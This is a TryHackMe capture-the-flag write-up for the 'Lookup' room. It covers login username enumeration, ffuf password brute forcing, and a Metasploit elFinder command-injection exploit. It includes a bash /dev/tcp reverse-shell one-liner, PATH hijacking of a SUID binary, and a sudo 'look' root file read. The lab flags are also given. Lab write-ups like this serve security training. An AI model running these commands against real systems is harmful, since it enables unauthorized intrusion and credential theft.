## Lookup - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/lookup)

<i>Lookup offers a treasure trove of learning opportunities for aspiring hackers. This intriguing machine showcases various real-world vulnerabilities, ranging from web application weaknesses to privilege escalation techniques. 
By exploring and exploiting these vulnerabilities, hackers can sharpen their skills and gain invaluable experience in ethical hacking. 
Through "Lookup," hackers can master the art of reconnaissance, scanning, and enumeration to uncover hidden services and subdomains. 
They will learn how to exploit web application vulnerabilities, such as command injection, and understand the significance of secure coding practices. 
The machine also challenges hackers to automate tasks, demonstrating the power of scripting in penetration testing.﻿

Note: It is recommended to use your own VM if you'll ever experience problems visualizing the site.</i>

**IP: lookup.thm**

**Replace [YOUR-THM-IP] with your own machine IP assigned by TryHackMe.**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Linux Privilege Escalation, Brute Force <br>

**Tools Used**: Nmap, Hydra, Ffuf, Metasploit, Burp Suite<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20NEW.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Starting with Nmap scan. For hidden assets, all my tools found nothing, only Nikto found `/login.php` and thats it. Don't forget to add IP to `/etc/hosts`.

  ```
  nmap -sC -sV -T5 -p- lookup.thm
  
  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   3072 c2:8f:a8:01:9c:10:d1:7d:3c:78:6a:01:ee:a9:e4:74 (RSA)
  |   256 5a:8f:ec:27:04:76:29:97:59:60:6a:e5:bd:61:13:df (ECDSA)
  |_  256 8a:cd:e6:27:bb:17:05:37:58:8b:74:2b:1c:76:39:33 (ED25519)
  80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
  |_http-title: Login Page
  |_http-server-header: Apache/2.4.41 (Ubuntu)
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  ```
  
- On login page, when I typed admin credentials and random credentials I got 2 different responses.

  ```
  admin:admin

  Wrong password. Please try again.
  Redirecting in 3 seconds.
  
  bimbo:test
  
  Wrong username or password. Please try again.
  Redirecting in 3 seconds.
  ```
  
- Here, I tried SQLI and it didn't work. Then, I wrote a script to brute force some possible usernames. Keep in mind, script took a while to find one username. Machine also expired like 2 times while I was doing this room....

  ```
  python3 brute.py http://lookup.thm/login.php /seclists/Usernames/Names/names.txt

  [+] Loaded 10177 usernames from /seclists/Usernames/Names/names.txt
  [*] Starting brute-force...
  
  [+] Valid username found: admin
  [+] Valid username found: jose
  ```

- Now I used `hydra` to brute force a password, but it couldn't do it, so I switched to `ffuf` and found a password. Use Burp to catch all of the parameters.

  ```
  ffuf -w /seclists/Passwords/Leaked-Databases/fortinet-2021_passwords.txt  -X POST -u http://lookup.thm/login.php -d 'username=jose&password=FUZZ' -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8"  -fw 8

  password123             [Status: 200, Size: 74, Words: 10, Lines: 1, Duration: 49ms]
  password123             [Status: 200, Size: 74, Words: 10, Lines: 1, Duration: 49ms]
  password123             [Status: 200, Size: 74, Words: 10, Lines: 1, Duration: 48ms]
  password123             [Status: 200, Size: 74, Words: 10, Lines: 1, Duration: 49ms]
  password123             [Status: 200, Size: 74, Words: 10, Lines: 1, Duration: 49ms]
  password123             [Status: 200, Size: 74, Words: 10, Lines: 1, Duration: 49ms]
  password123             [Status: 200, Size: 74, Words: 10, Lines: 1, Duration: 49ms]
  ```
  
---

## ⚙️ Shell Access

- After logging in you will be redirected to subdomain `files.lookup.thm`. Add it to `/etc/hosts` and then you can see the page `http://files.lookup.thm/elFinder/elfinder.html#elf_l1_Lw`.

- Then I looked for some `ElFinder` exploits and found one in Metasploit.

  ```
  searchsploit elfinder     
  ----------------------------------------------------------------------------------- ---------------------------------
   Exploit Title                                                                     |  Path
  ----------------------------------------------------------------------------------- ---------------------------------
  elFinder 2 - Remote Command Execution (via File Creation)                          | php/webapps/36925.py
  elFinder 2.1.47 - 'PHP connector' Command Injection                                | php/webapps/46481.py
  elFinder PHP Connector < 2.1.48 - 'exiftran' Command Injection (Metasploit)        | php/remote/46539.rb
  elFinder Web file manager Version - 2.1.53 Remote Command Execution                | php/webapps/51864.txt
  ----------------------------------------------------------------------------------- ---------------------------------
  Shellcodes: No Results
  ```
  
- Start a Metasploit, use the exploit, fill all parameters and run it.

  ```
  msf6 > search elfinder

  Matching Modules
  ================
  
     #  Name                                                               Disclosure Date  Rank       Check  Description
     -  ----                                                               ---------------  ----       -----  -----------
     0  exploit/multi/http/builderengine_upload_exec                       2016-09-18       excellent  Yes    BuilderEngine Arbitrary File Upload Vulnerability and execution
     1  exploit/unix/webapp/tikiwiki_upload_exec                           2016-07-11       excellent  Yes    Tiki Wiki Unauthenticated File Upload Vulnerability
     2  exploit/multi/http/wp_file_manager_rce                             2020-09-09       normal     Yes    WordPress File Manager Unauthenticated Remote Code Execution
     3  exploit/linux/http/elfinder_archive_cmd_injection                  2021-06-13       excellent  Yes    elFinder Archive Command Injection
     4  exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection  2019-02-26       excellent  Yes    elFinder PHP Connector exiftran Command Injection
  
  msf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > set RHOSTS files.lookup.thm
  RHOSTS => files.lookup.thm
  msf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > set LHOST [YOUR-THM-IP]
  LHOST => [YOUR-THM-IP]
  msf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > run
  [*] Started reverse TCP handler on [YOUR-THM-IP]:4444 
  [*] Uploading payload 'sQUJIe.jpg;echo 6370202e2e2f66696c65732f7351554a49652e6a70672a6563686f2a202e464959745a436c652e706870 |xxd -r -p |sh& #.jpg' (1922 bytes)
  [*] Triggering vulnerability via image rotation ...
  [*] Executing payload (/elFinder/php/.FIYtZCle.php) ...
  [*] Sending stage (40004 bytes) to 10.10.13.84
  [+] Deleted .FIYtZCle.php
  [*] Meterpreter session 1 opened ([YOUR-THM-IP]:4444 -> 10.10.13.84:45108) at 2025-05-31 20:08:41 +0100
  [*] No reply
  [*] Removing uploaded file ...
  [+] Deleted uploaded file
  
  meterpreter > shell
  Process 1951 created.
  Channel 0 created.
  whoami
  www-data
  id
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  ```
  
- Now switch to more stable shell and let's look for flags.

  ```
  bash -c 'exec bash -i >& /dev/tcp/[YOUR-THM-IP]/4444 0>&1'

  nc -lvnp 4444                    
  listening on [any] 4444 ...
  connect to [YOUR-THM-IP] from (UNKNOWN) [10.10.13.84] 34260
  bash: cannot set terminal process group (806): Inappropriate ioctl for device
  bash: no job control in this shell
  www-data@ip-10-10-13-84:/home$ whoami
  whoami
  www-data
  ```

---

## 🧍 User Privilege Escalation

- We can't read any flag as user `www-data` so I started enumerating the machine and found this bad boi `/usr/sbin/pwm`.

  ```
  www-data@ip-10-10-13-84:/home/think$ find / -perm -u=s -type f 2>/dev/null
  /snap/snapd/19457/usr/lib/snapd/snap-confine
  /snap/core20/1950/usr/bin/chfn
  /snap/core20/1950/usr/bin/chsh
  /snap/core20/1950/usr/bin/gpasswd
  /snap/core20/1950/usr/bin/mount
  /snap/core20/1950/usr/bin/newgrp
  /snap/core20/1950/usr/bin/passwd
  /snap/core20/1950/usr/bin/su
  /snap/core20/1950/usr/bin/sudo
  /snap/core20/1950/usr/bin/umount
  /snap/core20/1950/usr/lib/dbus-1.0/dbus-daemon-launch-helper
  /snap/core20/1950/usr/lib/openssh/ssh-keysign
  /snap/core20/1974/usr/bin/chfn
  /snap/core20/1974/usr/bin/chsh
  /snap/core20/1974/usr/bin/gpasswd
  /snap/core20/1974/usr/bin/mount
  /snap/core20/1974/usr/bin/newgrp
  /snap/core20/1974/usr/bin/passwd
  /snap/core20/1974/usr/bin/su
  /snap/core20/1974/usr/bin/sudo
  /snap/core20/1974/usr/bin/umount
  /snap/core20/1974/usr/lib/dbus-1.0/dbus-daemon-launch-helper
  /snap/core20/1974/usr/lib/openssh/ssh-keysign
  /usr/lib/policykit-1/polkit-agent-helper-1
  /usr/lib/openssh/ssh-keysign
  /usr/lib/eject/dmcrypt-get-device
  /usr/lib/dbus-1.0/dbus-daemon-launch-helper
  /usr/sbin/pwm
  /usr/bin/at
  /usr/bin/fusermount
  /usr/bin/gpasswd
  /usr/bin/chfn
  /usr/bin/sudo
  /usr/bin/chsh
  /usr/bin/passwd
  /usr/bin/mount
  /usr/bin/su
  /usr/bin/newgrp
  /usr/bin/pkexec
  /usr/bin/umount
  ```
  
- This was my first time seeing this file, but luckily GPT got my back. We need to replace the group we are in, add it to path and then run `pwm` file. Here's the exploit.

  ```
  www-data@ip-10-10-13-84:/home$ echo '#!/bin/bash' > /tmp/id
  www-data@ip-10-10-13-84:/home$ echo 'echo "uid=33(think) gid=33(think) groups=(think)"' >> /tmp/id
  www-data@ip-10-10-13-84:/home$ chmod +x /tmp/id
  www-data@ip-10-10-13-84:/home$ export PATH=/tmp:$PATH
  www-data@ip-10-10-13-84:/home$ /usr/sbin/pwm
  [!] Running 'id' command to extract the username and user ID (UID)
  [!] ID: think
  jose1006
  jose1004
  jose1002
  jose1001teles
  jose100190
  jose10001
  jose10.asd
  jose10+
  jose0_07
  jose0990
  jose0986$
  jose098130443
  jose0981
  jose0924
  jose0923
  jose0921
  thepassword
  jose(1993)
  jose'sbabygurl
  jose&vane
  jose&takie
  jose&samantha
  jose&pam
  jose&jlo
  jose&jessica
  jose&jessi
  josemario.AKA(think)
  jose.medina.
  jose.mar
  jose.luis.24.oct
  jose.line
  jose.leonardo100
  jose.leas.30
  jose.ivan
  jose.i22
  jose.hm
  jose.hater
  jose.fa
  jose.f
  jose.dont
  jose.d
  jose.com}
  jose.com
  jose.chepe_06
  jose.a91
  jose.a
  jose.96.
  jose.9298
  jose.2856171
  ```
  
- Out of all these passwords, one stands out. Use it to connect with SSH and read the flag.

  ```
  ssh think@10.10.13.84
  josemario.AKA(think)
  
  think@ip-10-10-13-84:~$ cat /home/think/user.txt 
  38375fb4dd8baa2b2039ac03d92b820e
  ```

---

## 👑 Root Privilege Escalation

- Getting root flag is much easier than user flag. Run `sudo -l` and then check GTFOBin for exploit.

  ```
  think@ip-10-10-13-84:~$ sudo -l
  [sudo] password for think: 
  Matching Defaults entries for think on ip-10-10-13-84:
      env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
  
  User think may run the following commands on ip-10-10-13-84:
      (ALL) /usr/bin/look
  
  think@ip-10-10-13-84:~$ sudo look '' "/root/root.txt"
  5a285a9f257e45c68bb6c9f9f57d18e8
  ```

---

## 🏁 Flags

- **User Flag**: `38375fb4dd8baa2b2039ac03d92b820e`
- **Root Flag**: `5a285a9f257e45c68bb6c9f9f57d18e8`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Nothing much, just brute forcing is boring.`

- What did I learn?
  `How annoying brute forcing is...`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
